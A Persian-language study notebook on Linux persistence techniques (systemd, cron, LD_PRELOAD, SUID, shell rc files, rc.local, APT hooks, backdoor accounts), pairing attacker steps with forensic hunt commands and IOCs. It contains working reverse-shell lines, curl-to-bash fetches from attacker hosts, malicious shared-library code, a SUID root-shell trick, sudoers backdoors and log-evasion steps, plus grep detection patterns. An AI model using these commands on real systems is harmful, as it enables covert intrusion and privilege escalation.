
# Linux Persistence: Systemd Service & Timer

---

## چرا Systemd برای Persistence؟

مهاجم پس از دسترسی اولیه:
    │
    ├─ نیاز داره بعد از reboot هم دسترسی داشته باشه
    ├─ باید مثل یه سرویس قانونی به نظر برسه
    └─ systemd → بهترین گزینه چون:
            • root-level execution
            • auto-restart قابل تنظیم
            • log های قابل دستکاری
            • نام‌گذاری شبیه سرویس‌های قانونی


---

## ساختار فایل‌های Systemd

### مسیرها

/etc/systemd/system/          ← سرویس‌های سیستمی (root)
/usr/lib/systemd/system/      ← سرویس‌های نصب شده توسط پکیج‌ها
~/.config/systemd/user/       ← سرویس‌های user-level (بدون root)


---

## Systemd Service Unit

### ساختار کامل یک `.service` فایل

```ini
# /etc/systemd/system/systemd-network-sync.service
# ← نام مشابه سرویس قانونی برای camouflage

[Unit]
Description=Network Synchronization Service
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1'
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
```

---

### توضیح هر Section

[Unit]
├─ Description     → توضیح که در systemctl status نمایش داده میشه
├─ After           → بعد از کدام target اجرا بشه
└─ Wants           → وابستگی‌های نرم (soft dependency)

[Service]
├─ Type
│   ├─ simple      → پروسه اصلی مستقیم اجرا میشه
│   ├─ forking     → پروسه fork میکنه (daemon های قدیمی)
│   ├─ oneshot     → یکبار اجرا و تموم
│   └─ idle        → بعد از اتمام همه job ها
│
├─ ExecStart       → دستور اصلی اجرا
├─ ExecStartPre    → دستور قبل از اجرا
├─ ExecStartPost   → دستور بعد از اجرا
│
├─ Restart
│   ├─ always      → همیشه restart (حتی exit موفق)
│   ├─ on-failure  → فقط در صورت خطا
│   └─ no          → restart نمیکنه
│
├─ RestartSec      → فاصله بین restart ها (ثانیه)
└─ User            → با کدام user اجرا بشه

[Install]
└─ WantedBy       → در کدام target فعال بشه
                    multi-user.target = runlevel 3 (non-graphical)
                    graphical.target  = runlevel 5 (با GUI)


---

## Systemd Timer Unit

### Timer به عنوان جایگزین Cron

```ini
# /etc/systemd/system/systemd-network-sync.timer

[Unit]
Description=Network Synchronization Timer
Requires=systemd-network-sync.service

[Timer]
OnBootSec=60           ← 60 ثانیه بعد از boot
OnUnitActiveSec=5m     ← هر 5 دقیقه یکبار
Unit=systemd-network-sync.service

[Install]
WantedBy=timers.target
```

---

### انواع Timer Trigger

زمان‌بندی مطلق (Realtime):
├─ OnCalendar=daily           → هر روز ساعت 00:00
├─ OnCalendar=Mon *-*-* 04:00 → دوشنبه‌ها ساعت 4 صبح
└─ OnCalendar=*:0/15          → هر 15 دقیقه

زمان‌بندی نسبی (Monotonic):
├─ OnBootSec=30s      → 30 ثانیه بعد از boot
├─ OnStartupSec=5m    → 5 دقیقه بعد از start سرویس
├─ OnActiveSec=1h     → 1 ساعت بعد از فعال شدن timer
└─ OnUnitActiveSec=10m → هر 10 دقیقه


---

## فعال‌سازی توسط مهاجم

```bash
# قدم ۱: نوشتن فایل‌ها
cat > /etc/systemd/system/systemd-network-sync.service << 'EOF'
[Unit]
Description=Network Synchronization Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /tmp/.cache/sync.py
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# قدم ۲: reload کردن daemon
systemctl daemon-reload

# قدم ۳: فعال کردن (persistent across reboots)
systemctl enable systemd-network-sync.service

# قدم ۴: شروع سرویس
systemctl start systemd-network-sync.service
```

---

## تکنیک‌های Camouflage

### نام‌گذاری مشابه سرویس‌های قانونی

سرویس‌های قانونی ← نام‌های مشابه مهاجم
──────────────────────────────────────────────────
systemd-networkd    ← systemd-network-sync
cron.service        ← crond-helper
ssh.service         ← sshd-monitor
dbus.service        ← dbus-daemon-helper
cups.service        ← cupsd-monitor


### مخفی کردن Payload

```bash
# Payload در مسیرهای کمتر دیده شده
/usr/share/man/.hidden/
/var/cache/apt/.cache/
/lib/systemd/system/../../../tmp/
/proc/self/fd/../../../

# Encoding payload در ExecStart
ExecStart=/bin/bash -c 'echo "BASE64==" | base64 -d | bash'

# استفاده از فایل‌های قانونی
ExecStart=/usr/bin/python3 /usr/lib/python3/dist-packages/logging/config.py
```

---

## Forensic Analysis

### لاگ‌ها و شواهد

```bash
# ۱. لیست تمام سرویس‌های فعال
systemctl list-units --type=service --state=active

# ۲. لیست تمام timer ها
systemctl list-timers --all

# ۳. بررسی لاگ یک سرویس
journalctl -u systemd-network-sync.service

# ۴. زمان ایجاد فایل‌های unit
ls -la --full-time /etc/systemd/system/
stat /etc/systemd/system/systemd-network-sync.service

# ۵. محتوای فایل‌های unit
cat /etc/systemd/system/*.service | grep -E "(ExecStart|ExecStop)"

# ۶. لاگ‌های journald
journalctl --since "2024-01-01" | grep -i "start\|enable\|daemon-reload"
```

---

### شاخص‌های مشکوک (IOCs)

شاخص‌های فایل:
├─ فایل .service ایجاد شده در تاریخ غیر معمول
├─ ExecStart با base64, /tmp/, /dev/tcp
├─ Restart=always در سرویس‌های ناشناخته
└─ مسیر Payload در /tmp, /var/tmp, /dev/shm

شاخص‌های رفتاری:
├─ daemon-reload در لاگ‌ها (بدون نصب پکیج)
├─ systemctl enable در ساعت غیر کاری
└─ سرویس جدید بعد از یک incident

شاخص‌های شبکه:
├─ outbound connection به IP عجیب بعد از boot
└─ connection با interval منظم (timer)


---

## Hunt Query (Bash)

```bash
#!/bin/bash
# Hunt for suspicious systemd services

echo "=== Systemd Persistence Hunter ==="

# سرویس‌هایی که ExecStart مشکوک دارن
echo "[*] Suspicious ExecStart patterns:"
grep -rE "(ExecStart|ExecStartPre).*(/tmp|/dev/shm|base64|curl|wget|python|bash -c)" \
    /etc/systemd/system/ 2>/dev/null

# سرویس‌هایی با Restart=always
echo "[*] Services with Restart=always:"
grep -rl "Restart=always" /etc/systemd/system/ 2>/dev/null

# فایل‌های unit ایجاد شده اخیراً (30 روز)
echo "[*] Recently created unit files:"
find /etc/systemd/system/ -mtime -30 -name "*.service" -o -name "*.timer" 2>/dev/null

# Timer های فعال
echo "[*] Active timers:"
systemctl list-timers --all --no-pager
```

---

## مقایسه با سایر روش‌های Persistence

روش              │ نیاز Root │ بعد Reboot │ Detectability
─────────────────┼───────────┼────────────┼──────────────
systemd service  │    بله    │     بله    │    متوسط
cron job         │    خیر    │     بله    │    راحت
.bashrc          │    خیر    │    Session │    راحت
LD_PRELOAD       │    بله    │     بله    │    سخت
Kernel Module    │    بله    │    نیاز*   │    خیلی سخت


---


# Cron Job Persistence

---

## معماری Cron در لینوکس

Cron Subsystem
│
├─ /var/spool/cron/crontabs/username   ← crontab -e (per-user)
├─ /etc/crontab                          ← system-wide crontab
├─ /etc/cron.d/                          ← drop-in directory
│
├─ /etc/cron.hourly/                     ← اسکریپت‌های اجرایی
├─ /etc/cron.daily/
├─ /etc/cron.weekly/
└─ /etc/cron.monthly/


---

## فرمت Crontab

┌─────────── minute        (0-59)
│ ┌───────── hour           (0-23)
│ │ ┌─────── day of month   (1-31)
│ │ │ ┌───── month          (1-12)
│ │ │ │ ┌─── day of week    (0-6, Sun=0)
│ │ │ │ │
* * * * *   [user]   command

![[Pasted image 20260613000636.png]]


![[Pasted image 20260613004020.png]]

با استفاده از این سایت میتونیم تایم رو سریع تر بدیم 
### مثال‌های رایج

```bash
* * * * *        → هر دقیقه
*/5 * * * *      → هر 5 دقیقه
0 * * * *        → هر ساعت
0 4 * * *        → هر روز 4 صبح
0 4 * * 1        → دوشنبه‌ها 4 صبح
@reboot          → بعد از هر reboot
```

---

## تفاوت‌های کلیدی

### `/var/spool/cron/crontabs/`

```bash
# فرمت: بدون فیلد user
* * * * * /tmp/payload.sh

# مالکیت: فایل به نام همان user
ls -la /var/spool/cron/crontabs/
# -rw------- 1 root   crontab  root
# -rw------- 1 www-data crontab www-data
```

### `/etc/crontab` و `/etc/cron.d/`

```bash
# فرمت: با فیلد user (ستون ششم)
* * * * * root /tmp/payload.sh
* * * * * www-data curl http://10.10.10.5/beacon.sh | bash
```

---

## تکنیک‌های مهاجم

### ۱. مستقیم در crontab کاربر

```bash
# بدون crontab -e (بدون ایجاد temp file)
echo "* * * * * bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" \
    | crontab -u root -

# یا نوشتن مستقیم
echo "*/5 * * * * /bin/bash /dev/.hidden/persist.sh" \
    >> /var/spool/cron/crontabs/root
```

### ۲. Drop-in در `/etc/cron.d/`

```bash
# نام فایل مشابه سرویس قانونی
cat > /etc/cron.d/php-fpm-check << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/10 * * * * root /usr/share/doc/.cache/update.sh > /dev/null 2>&1
EOF
```

### ۳. قرار دادن اسکریپت در `cron.daily`

```bash
# فایل باید executable باشه و نام بدون پسوند
cp payload.sh /etc/cron.daily/logrotate-helper
chmod +x /etc/cron.daily/logrotate-helper
```

### ۴. تکنیک `@reboot`

```bash
# اجرا بعد از هر reboot
echo "@reboot root /tmp/.x/r.sh" > /etc/cron.d/systemd-check
```

---

## Anti-Forensic در Cron

```bash
# ریدایرکت output به /dev/null (بدون لاگ)
* * * * * command > /dev/null 2>&1

# حذف فایل بعد از اجرا
* * * * * /tmp/p.sh && rm -f /tmp/p.sh

# دستکاری timestamp فایل
touch -t 202001010000 /etc/cron.d/malicious

# یه‌بار اجرا و حذف entry
* * * * * crontab -r && /tmp/payload.sh
```

---

## Forensic Analysis

```bash
# ۱. همه crontab های کاربران
for user in $(cut -f1 -d: /etc/passwd); do
    echo "=== $user ===" 
    crontab -u $user -l 2>/dev/null
done

# ۲. بررسی همه مسیرها
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.{hourly,daily,weekly,monthly}/
ls -la /var/spool/cron/crontabs/

# ۳. زمان تغییر فایل‌ها
find /etc/cron* /var/spool/cron -newer /etc/passwd -ls 2>/dev/null

# ۴. لاگ اجرای cron
grep CRON /var/log/syslog | tail -50
grep CRON /var/log/cron   | tail -50       # RHEL/CentOS
journalctl -u cron --since "24h ago"
```

---

## شاخص‌های مشکوک

در محتوا:
├─ /dev/tcp, /dev/udp         → reverse shell
├─ curl|bash یا wget|bash     → fileless execution
├─ base64 -d                  → encoded payload
├─ /tmp, /dev/shm, /var/tmp   → مسیرهای موقت
└─ > /dev/null 2>&1           → مخفی کردن output

در متادیتا:
├─ timestamp نامتناسب با سیستم
├─ مالک فایل با محتوای user متفاوت
└─ فایل جدید در /etc/cron.d بدون نصب پکیج


---

## دستورات Crontab

```bash
crontab -l              # نمایش crontab فعلی
crontab -e              # ویرایش crontab (با editor پیش‌فرض)
crontab -r              # حذف کامل crontab کاربر فعلی
crontab -i              # حذف با تایید (interactive)
crontab -u <user> -l    # نمایش crontab یک کاربر خاص (root)
crontab -u <user> -e    # ویرایش crontab یک کاربر خاص (root)
crontab -u <user> -r    # حذف crontab یک کاربر خاص (root)
```

---

## مثال‌های کاربردی

```bash
# افزودن entry بدون باز کردن editor
(crontab -l; echo "*/5 * * * * /tmp/script.sh") | crontab -

# بکاپ قبل از تغییر
crontab -l > ~/crontab.bak

# ریستور از بکاپ
crontab ~/crontab.bak

# حذف یک entry خاص
crontab -l | grep -v "script.sh" | crontab -
```

---

## نکته Forensic

```bash
# -r بدون -i خطرناکه، بلافاصله همه چیز رو حذف می‌کنه
crontab -r    # ⚠ بدون تایید
crontab -ri   # با تایید (safer)
```


---

## LD_PRELOAD / ld.so.preload Hijacking

### مکانیزم

وقتی یک برنامه اجرا می‌شه، dynamic linker قبل از هر کتابخونه دیگه‌ای، کتابخونه‌های تعریف‌شده در این دو مکان رو load می‌کنه:

LD_PRELOAD (env var)  →  /etc/ld.so.preload  →  کتابخونه‌های معمول


---

### ۱. LD_PRELOAD (محیطی)

```bash
# ساخت shared library مخرب
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Override تابع getuid
uid_t getuid(void) {
    system("/bin/bash -i >& /dev/tcp/attacker/4444 0>&1");
    return 0;
}
EOF

gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c

# اجرا
LD_PRELOAD=/tmp/evil.so /usr/bin/find
```

**محدودیت:** روی SUID binaries کار نمی‌کنه (kernel این env var رو نادیده می‌گیره)

---

### ۲. /etc/ld.so.preload (سیستمی)

```bash
# نیاز به root داره
echo "/tmp/evil.so" >> /etc/ld.so.preload

# از این لحظه هر فرآیندی که اجرا بشه evil.so رو load می‌کنه
# حتی SUID binaries
```

**تفاوت کلیدی:** `/etc/ld.so.preload` روی همه فرآیندها از جمله SUID اعمال می‌شه.

---

### تکنیک Persistence + Privilege Escalation

```c
// کتابخونه‌ای که فقط یک‌بار اجرا می‌شه و خودش رو پنهان می‌کنه
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

__attribute__((constructor)) void init(void) {
    // اجرای reverse shell یا backdoor
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash");
}
```

---

### شکار (Detection)

```bash
# بررسی محتوای فایل
cat /etc/ld.so.preload

# فایل‌های غیرعادی در مسیرهای غیررسمی
strings /etc/ld.so.preload | grep -v "^/usr\|^/lib"

# بررسی کدام فرآیندها یک SO غیرمعمول load کردن
for pid in /proc/[0-9]*; do
    grep -l "evil\|tmp\|hidden" $pid/maps 2>/dev/null
done

# با ldd بررسی وابستگی‌های یک binary
ldd /usr/bin/sudo | grep -v "standard\|/lib\|/usr"
```

---

### ابزار Forensic

```bash
# پیدا کردن SOهای load شده توسط فرآیند خاص
cat /proc/<PID>/maps | grep "\.so"

# auditd برای monitor کردن تغییر فایل
auditctl -w /etc/ld.so.preload -p wa -k preload_tamper
ausearch -k preload_tamper
```

---

| ویژگی          | LD_PRELOAD  | /etc/ld.so.preload |
| -------------- | ----------- | ------------------ |
| نیاز به root   | خیر         | بله                |
| اعمال روی SUID | خیر         | بله                |
| Scope          | فرآیند جاری | کل سیستم           |
| Persistence    | خیر         | بله                |


## تحلیل کد

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

__attribute__((constructor)) void preload() {
    int fd = open("/tmp/log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd != -1) {
        write(fd, "HACKED\n", 7);
        close(fd);
    }
}
```

---

### `__attribute__((constructor))`

این یه GCC extension هست. تابعی که با این attribute تعریف بشه، **قبل از `main()`** اجرا می‌شه، دقیقاً در مرحله load کردن shared library.

dlopen() / ld-linux.so
    → کتابخونه رو load می‌کنه
    → constructor رو اجرا می‌کنه   ← اینجا کد مخرب اجرا میشه
    → بعد main() اجرا میشه


---

### کاری که کد انجام میده

1. فایل `/tmp/log.txt` رو باز/ایجاد می‌کنه
2. رشته `HACKED\n` رو می‌نویسه
3. فایل رو می‌بنده

در یه سناریوی واقعی به جای نوشتن در فایل: reverse shell، کپی credential، یا نصب backdoor.

---

## ارتباط با DLL Hijacking

### مفهوم مشترک

| ویندوز (DLL Hijack) | لینوکس (SO Hijack) |
|---|---|
| `.dll` | `.so` |
| `LoadLibrary()` / search order | `LD_PRELOAD` / `ld.so.preload` |
| `DllMain(DLL_PROCESS_ATTACH)` | `__attribute__((constructor))` |
| رجیستری / PATH | `/etc/ld.so.conf` / `RPATH` |

---

### مکانیزم DLL Hijacking در ویندوز

برنامه → LoadLibrary("version.dll")
    → جستجو در current directory  ← مهاجم اینجا DLL مخرب می‌ذاره
    → جستجو در System32
    → جستجو در PATH


معادل این روی لینوکس:

```bash
# مهاجم یه .so با همون اسم کتابخونه واقعی می‌سازه
# و RPATH یا LD_LIBRARY_PATH رو دستکاری می‌کنه
LD_LIBRARY_PATH=/tmp/evil gcc-output  # اول /tmp/evil رو چک می‌کنه
```

---

### تفاوت کلیدی

DLL Hijack  →  یه DLL خاص رو جایگزین می‌کنه (targeted)
LD_PRELOAD  →  قبل از همه کتابخونه‌ها inject میشه (global hook)


**هر دو روش** از همین ایده استفاده می‌کنن:
> "وقتی یه binary کتابخونه‌ای رو load می‌کنه، ما اون لحظه رو intercept می‌کنیم"

---

### کامپایل و تست

```bash
gcc -shared -fPIC -o /tmp/evil.so evil.c

# روش ۱: فقط برای یه فرآیند
LD_PRELOAD=/tmp/evil.so ls

# روش ۲: کل سیستم (root)
echo "/tmp/evil.so" > /etc/ld.so.preload

# نتیجه
cat /tmp/log.txt
# HACKED
```




---

### چه اتفاقی می‌افته؟

gcc -shared -fPIC -o evil.so evil.c


کامپایلر این تابع رو در یه section خاص به اسم **`.init_array`** ثبت می‌کنه:

```bash
objdump -h evil.so | grep init
# .init_array   ← آدرس تابع constructor اینجا ذخیره میشه
```

---

### موقع اجرای برنامه:

kernel → ld-linux.so (dynamic linker)
    → shared libraryها رو load می‌کنه
    → .init_array هر SO رو می‌خونه
    → توابع اون رو اجرا می‌کنه   ← اینجا constructor اجرا میشه
    → بعد main() فراخوانی میشه


---

### یه مثال ساده برای تایید:

```c
__attribute__((constructor)) void before() {
    printf("1. Constructor\n");
}

int main() {
    printf("2. Main\n");
    return 0;
}
```

خروجی:
1. Constructor
2. Main


---

### جمع‌بندی

|                    |                                            |
| ------------------ | ------------------------------------------ |
| **کامپایلر**       | تابع رو در `.init_array` ثبت می‌کنه        |
| **Dynamic linker** | موقع load، `.init_array` رو execute می‌کنه |
| **نتیجه**          | کد قبل از `main()` اجرا میشه               |

تقریباً درسته، ولی چند نکته تصحیح داره:

---

### تصحیح‌ها:

**۱. کی `.init_array` رو می‌سازه؟**

- **کامپایلر (gcc)** موقع compile، تابع constructor رو در `.init_array` ثبت می‌کنه
- **Dynamic linker (`ld-linux.so`)** موقع اجرا، `.init_array` رو می‌خونه و execute می‌کنه

پس linker فقط *اجرا* می‌کنه، نه *ثبت*.

---

**۲. درباره `ld.so.preload` و SUID:**

/etc/ld.so.preload  ←  لیست SO هایی که قبل از همه چیز load میشن


نکته مهم‌تر اینه که:

LD_PRELOAD  ←  برای SUID binaries نادیده گرفته میشه (توسط kernel)
/etc/ld.so.preload  ←  برای SUID binaries هم اعمال میشه ← خطرناکه


---

### فلو کامل:

اجرای هر binary (از جمله SUID)
    → kernel → ld-linux.so
        → /etc/ld.so.preload رو می‌خونه
        → هر SO لیست‌شده رو load می‌کنه
        → .init_array اون SO اجرا میشه  ← constructor اینجا run میشه
        → main() برنامه اصلی


---

### چرا Privilege Escalation؟

```c
// evil.so
__attribute__((constructor)) void pwn() {
    if (geteuid() == 0) {        // اگه SUID باشه، euid=0
        system("cp /bin/bash /tmp/rootbash");
        system("chmod +s /tmp/rootbash");
    }
}
```

چون `sudo`, `passwd`, `ping` همه SUID هستن و این SO روشون اعمال میشه.

---

### جمع‌بندی اصلاح‌شده:

| مرحله                            | عامل                             |
| -------------------------------- | -------------------------------- |
| ثبت constructor در `.init_array` | **gcc (کامپایلر)**               |
| خواندن `/etc/ld.so.preload`      | **ld-linux.so (dynamic linker)** |
| اجرای `.init_array`              | **ld-linux.so (dynamic linker)** |
| اعمال روی SUID                   | بله، برخلاف `LD_PRELOAD`         |



## SUID (Set User ID)

یه permission bit ویژه در لینوکسه که روی **executable files** تنظیم میشه.

---

### مکانیزم:

به طور عادی وقتی یه برنامه اجرا میشه:

user: alice  →  اجرای binary  →  process با UID=alice اجرا میشه


وقتی SUID set باشه:

user: alice  →  اجرای binary (owner: root, SUID=1)  →  process با UID=root اجرا میشه


یعنی **process با UID صاحب فایل** اجرا میشه، نه کاربر فعلی.

---

### شناسایی:

```bash
ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root ... /usr/bin/passwd
#   ^
#   s = SUID set
```

```bash
# پیدا کردن همه SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

---

### چرا لازمه؟

passwd   → باید /etc/shadow رو بنویسه  (root-only)
ping     → باید raw socket باز کنه    (root-only)
sudo     → باید privilege escalate کنه
mount    → باید filesystem mount کنه  (root-only)


بدون SUID، این برنامه‌ها به UID کاربر عادی محدود بودن و کار نمی‌کردن.

---

### ارتباط با `/etc/ld.so.preload`:

alice اجرا می‌کنه passwd
    → SUID: process با eUID=0 (root) اجرا میشه
    → ld-linux.so قبلش /etc/ld.so.preload رو می‌خونه
    → evil.so با eUID=0 load میشه
    → constructor در evil.so با root privilege اجرا میشه  ← PrivEsc


---

### خلاصه:

|                  | عادی           | SUID              |
| ---------------- | -------------- | ----------------- |
| **eUID process** | UID کاربر فعلی | UID صاحب فایل     |
| **مثال**         | `/bin/ls`      | `/usr/bin/passwd` |
| **نماد**         | `x`            | `s`               |



## Bash/Zsh Config Files — Persistence

---

### ترتیب Load شدن:

**Login Shell** (SSH login, `su -`):
/etc/profile → /etc/profile.d/*.sh → ~/.bash_profile → ~/.bash_login → ~/.profile


**Interactive Non-Login Shell** (ترمینال جدید، `bash`):
/etc/bash.bashrc → ~/.bashrc


**Zsh:**
/etc/zsh/zshenv → ~/.zshenv → ~/.zprofile → ~/.zshrc → ~/.zlogin


---

### تکنیک Persistence:

مهاجم یه خط به انتهای این فایل‌ها اضافه می‌کنه:

```bash
# تزریق در .bashrc
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &' >> ~/.bashrc

# یا اجرای یه باینری مخفی
echo 'nohup ~/.config/.hidden_agent &>/dev/null &' >> ~/.bashrc

# یا از طریق alias مخرب
echo 'alias sudo="sudo -p '\''Password: '\'' sh -c '\''id | nc 192.168.1.100 4444 & exec sudo'\''"' >> ~/.bashrc
```

---

### Alias Hijacking — خطرناک‌ترین روش:

```bash
# مهاجم در .bashrc می‌نویسه:
alias ssh='strace -o /tmp/.ssh_log -e read,write ssh'
# هر بار user از SSH استفاده کنه، credential ها log میشه

alias sudo='sudo "$@" & curl -s http://attacker.com/shell.sh | bash'
```

---

### تشخیص و Hunt:

```bash
# بررسی config files همه کاربران
find /home -name ".bashrc" -o -name ".bash_profile" -o -name ".profile" 2>/dev/null
find /root -name ".bashrc" -o -name ".zshrc" 2>/dev/null

# بررسی محتوا برای موارد مشکوک
grep -E "(nc|curl|wget|bash -i|/dev/tcp|nohup|base64)" ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null

# تاریخچه تغییر فایل
stat ~/.bashrc
ls -la --full-time ~/.bashrc
```

---

### مقایسه فایل‌ها:

| فایل | چه موقع اجرا میشه | هدف مهاجم |
|---|---|---|
| `.bashrc` | هر ترمینال جدید | پرکاربردترین — هر shell جدید |
| `.bash_profile` | فقط login shell | SSH login |
| `.profile` | login shell (sh/dash هم) | سازگاری بیشتر |
| `.zshrc` | هر zsh shell | سیستم‌های مک و اوبونتو جدید |

---

### نکته فارنزیک:

```bash
# timestamp فایل رو چک کن
stat ~/.bashrc
# اگه mtime با زمان login مشکوک همخوانی داشت → IOC

# diff با نسخه پاک
diff ~/.bashrc /etc/skel/.bashrc
```


## rc.local — Persistence

---

### چیست؟

`rc.local` یک اسکریپت shell است که در **آخرین مرحله boot** و **قبل از login prompt** اجرا می‌شود. سنتی‌ترین روش Persistence در لینوکس.

---

### مسیرها:

| مسیر | توزیع |
|---|---|
| `/etc/rc.local` | Debian, Ubuntu, CentOS قدیمی |
| `/etc/rc.d/rc.local` | RHEL, CentOS, Fedora |
| `/etc/rc.d/rc.local` → symlink به `/etc/rc.local` | بعضی توزیع‌ها هر دو دارن |

---

### ساختار فایل:

```bash
#!/bin/bash
# This script is executed at the end of each multiuser runlevel.

# -- مهاجم اینجا inject می‌کنه --
nohup /tmp/.svc_daemon &>/dev/null &
bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' &

exit 0
```

> **مهم:** فایل باید با `exit 0` تموم بشه وگرنه سیستم ممکنه مشکل داشته باشه.

---

### وضعیت در سیستم‌های مدرن (Systemd):

```bash
# Ubuntu/Debian — rc.local به عنوان یه systemd service اجرا میشه:
systemctl status rc-local.service

# فعال کردن (اگه غیرفعاله):
systemctl enable rc-local

# فایل unit مربوطه:
cat /lib/systemd/system/rc-local.service
```

```ini
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
RemainAfterExit=yes
```

---

### شرط اجرا:

```bash
# فایل باید executable باشه — مهاجم این رو تنظیم می‌کنه:
chmod +x /etc/rc.local

# اگه executable نباشه → اجرا نمیشه
ls -la /etc/rc.local
# -rwxr-xr-x ← باید x داشته باشه
```

---

### تشخیص و Hunt:

```bash
# بررسی محتوا
cat /etc/rc.local
cat /etc/rc.d/rc.local

# timestamp مشکوک
stat /etc/rc.local

# بررسی وضعیت سرویس
systemctl is-enabled rc-local

# لاگ اجرا
journalctl -u rc-local.service
```

---

### مقایسه با سایر روش‌های Persistence:

| روش | زمان اجرا | نیاز به root |
|---|---|---|
| `rc.local` | Boot | بله |
| `cron @reboot` | Boot | خیر (per-user) |
| `systemd service` | Boot/هر زمان | بله |
| `.bashrc` | هر shell جدید | خیر |
| `LD_PRELOAD` | هر اجرای برنامه | بستگی دارد |

---


## APT Config File Persistence

---

### مکانیزم:

APT
و dpkg هنگام اجرا، **hook scripts** را از `/etc/apt/apt.conf.d/` اجرا می‌کنند. مهاجم یک فایل config مخرب در این دایرکتوری می‌سازد.

---

### انواع Hook:

| Hook                       | زمان اجرا             |
| -------------------------- | --------------------- |
| `APT::Update::Pre-Invoke`  | قبل از `apt update`   |
| `APT::Update::Post-Invoke` | بعد از `apt update`   |
| `Dpkg::Pre-Invoke`         | قبل از هر عملیات dpkg |
| `Dpkg::Post-Invoke`        | بعد از هر عملیات dpkg |

---

### نمونه فایل مخرب:

```bash
# مهاجم این فایل رو می‌سازه:
cat /etc/apt/apt.conf.d/99-malware
```

APT::Update::Post-Invoke  { "bash /tmp/malware.sh"; };
APT::Update::Pre-Invoke   { "bash /tmp/malware.sh"; };
Dpkg::Pre-Invoke          { "bash /tmp/malware.sh"; };
Dpkg::Post-Invoke         { "bash /tmp/malware.sh"; };


---

### چرا مهم است:

- `apt update` / `apt install` توسط **cron** یا **admin** مرتباً اجرا می‌شود
- اجرا با سطح دسترسی **root**
- نام‌گذاری فایل می‌تواند مشابه فایل‌های قانونی باشد (`99updates`, `50apt-config`)

---

### تشخیص و Hunt:

```bash
# بررسی تمام فایل‌های config
ls -la /etc/apt/apt.conf.d/
cat /etc/apt/apt.conf.d/*

# جستجوی hook مشکوک
grep -r "Invoke" /etc/apt/apt.conf.d/

# timestamp مشکوک
stat /etc/apt/apt.conf.d/99-*

# فایل‌های اخیراً تغییر کرده
find /etc/apt/apt.conf.d/ -newer /etc/apt/apt.conf.d/01autoremove
```

---

### IOC:

- فایل جدید در `apt.conf.d/` با timestamp غیرعادی
- مسیر script در hook → `/tmp/`, `/dev/shm/`, home directory
- اجرای دستورات شبکه‌ای در hook

---

برای Demo بریم یکی از کانفیگ فایل هارو باهم edit کنیم 

![[Pasted image 20260613004647.png]]

![[Pasted image 20260613004703.png]]


اسکرول میکنیم میایم پایین 

![[Pasted image 20260613004719.png]]

همین دستور اول که مربوط به اسکریپت ما هست رو بهش میدیم 


![[Pasted image 20260613004757.png]]

سیو میکنیم و به محضی که کاربر بزنه می افته 


![[Pasted image 20260613004843.png]]


## Add User / Group - Persistence Technique

---

### هدف مهاجم:

ایجاد یک **backdoor account** با دسترسی root برای دسترسی مجدد بدون نیاز به exploit.

---

### دستورات رایج مهاجم:

```bash
# ساخت کاربر مخفی بدون پسورد و بدون تعامل
adduser hiddenuser --disabled-password --gecos ""

# اضافه کردن به گروه sudo
usermod -aG sudo hiddenuser

# اعطای NOPASSWD در sudoers
echo "hiddenuser ALL=(ALL) NOPASSWD:ALL" | tee -a /etc/sudoers

# یا نوشتن در فایل جداگانه (پنهان‌تر)
echo "hiddenuser ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/hiddenuser
```

---

### تکنیک‌های پنهان‌سازی:

```bash
# نام مشابه سرویس‌های سیستمی
adduser --system --no-create-home syslogd
adduser --system daemon2

# UID پایین (مشابه system accounts)
useradd -u 999 -r -s /bin/bash hiddenuser

# shell مخفی
usermod -s /bin/bash daemon

# حذف از wtmp/lastlog
usermod -e 1970-01-01 hiddenuser  # expire فوری برای کمتر دیده شدن
```

---

### مکانیزم Groups:

```bash
# گروه‌های حساس در لینوکس
addgroup shadowgroup
usermod -aG shadow  hiddenuser   # خواندن /etc/shadow
usermod -aG disk    hiddenuser   # دسترسی مستقیم به block device
usermod -aG docker  hiddenuser   # escape به root از طریق docker
usermod -aG lxd     hiddenuser   # همان تکنیک با lxd
```

---

### فایل‌های تغییر یافته:

| فایل | محتوا |
|---|---|
| `/etc/passwd` | اطلاعات کاربر جدید |
| `/etc/shadow` | hash پسورد |
| `/etc/group` | عضویت گروه |
| `/etc/gshadow` | گروه shadow |
| `/etc/sudoers` | دسترسی sudo |
| `/etc/sudoers.d/*` | فایل جداگانه sudo |

---

### Hunt و Detection:

```bash
# کاربرانی که shell دارند (غیر از /bin/false یا /usr/sbin/nologin)
awk -F: '$7 !~ /nologin|false/ {print $1,$3,$7}' /etc/passwd

# کاربران با UID > 999 (non-system) اما shell دارند
awk -F: '$3 >= 1000 && $7 ~ /bash|sh|zsh/ {print}' /etc/passwd

# بررسی sudoers
cat /etc/sudoers | grep -v "^#"
ls -la /etc/sudoers.d/
cat /etc/sudoers.d/*

# کاربران عضو گروه‌های حساس
getent group sudo docker lxd disk shadow

# کاربران بدون پسورد
awk -F: '$2 == "" {print $1}' /etc/shadow
```

---

### SIEM / auditd Rules:

```bash
# auditd - نظارت بر ساخت کاربر
-a always,exit -F arch=b64 -S execve -F path=/usr/sbin/useradd -k user_add
-a always,exit -F arch=b64 -S execve -F path=/usr/sbin/adduser  -k user_add
-w /etc/passwd   -p wa -k passwd_change
